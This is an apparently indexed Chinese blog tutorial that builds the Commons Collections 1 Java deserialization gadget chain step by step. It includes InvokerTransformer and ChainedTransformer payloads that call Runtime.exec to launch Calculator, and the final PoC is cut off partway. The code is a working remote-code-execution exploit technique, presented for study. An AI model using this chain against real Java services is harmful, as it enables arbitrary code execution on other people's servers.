[{"categories":["Java"],"content":" CommonsCollections1链详解jdk8源码下载 https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 漏洞触发点在org.apache.commons.collections.functors.InvokerTransformer 其中的transform()方法 很明显的一个反射调用，其中iMethodName、iParamTypes、iArgs都是可控的变量，便可以调用任意方法和任意参数 看一下构造器是如何赋值的 构造一个简单的 payload 试试 new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}).transform(Runtime.getRuntime()); `` 找一个任意类调用transforms()方法的方法，这里选择org.apache.commons.collections.map.TransformedMap类的checkSetValue()方法 valueTransformer变量可控 但是因为构造器是protected修饰，所以无法直接调用，利用这里的静态方法decorate()进行了调用 再查看一下哪里调用了checkSetValue()方法，只有这一处 setValue()方法调用了checkSetValue()，构造一个payload，看看能不能通 Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,invokerTransformer); for(Map.Entry entry:transformedMap.entrySet()){ entry.setValue(r); 接着找一个setValue()方法的调用，在sun.reflect.annotation.AnnotationInvocationHandler类中，找到了如下方法 这里调用了setValue()方法，并且还在readObject()方法中，继续构造poc Runtime r = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject,Object\u003e map = new HashMap\u003c\u003e(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,invokerTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor annotationInvocationhandleconstructor = c.getDeclaredConstructor(Class.class,Map.class); annotationInvocationhandleconstructor.setAccessible(true); Object o = annotationInvocationhandleconstructor.newInstance(Target.class,transformedMap); 但是这里存在两个问题 第一个问题是Runtime没有实现Seriablable接口，无法参与序列化过程 利用反射来解决，这里再利用一个ChainedTransformer.transform方法 简单来说就是上一个执行transform方法返回的结果作为下一个执行transform方法输入 Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 还有一个问题，无法控制setValue()里面的参数值 这里利用org.apache.commons.collections.functors.ConstantTransformer的transform()方法，无论传入什么，都会返回固定的值 所以完善一下上面的poc Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 于是完整的poc如下 package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonsCollection1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"get","date":"2024-01-14","objectID":"/posts/ca4c9c3/:0:0","tags":["CommonsCollections"],"title":"CommonsCollections1链详解","uri":"/posts/ca4c9c3/"},{"categories":["Java"],"content":" 注这里为什么要用Target Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); 因为Target中有值是value 这里的getKey()获取的就是，上面map.put()放入的key值 map.put(\"value\",\"value\"); key放入value，正好能取出Target中的值，所以就绕过了if条件 ","date":"2024-01-14","objectID":"/posts/ca4c9c3/:0:1","tags":["CommonsCollections"],"title":"CommonsCollections1链详解","uri":"/posts/ca4c9c3/"}]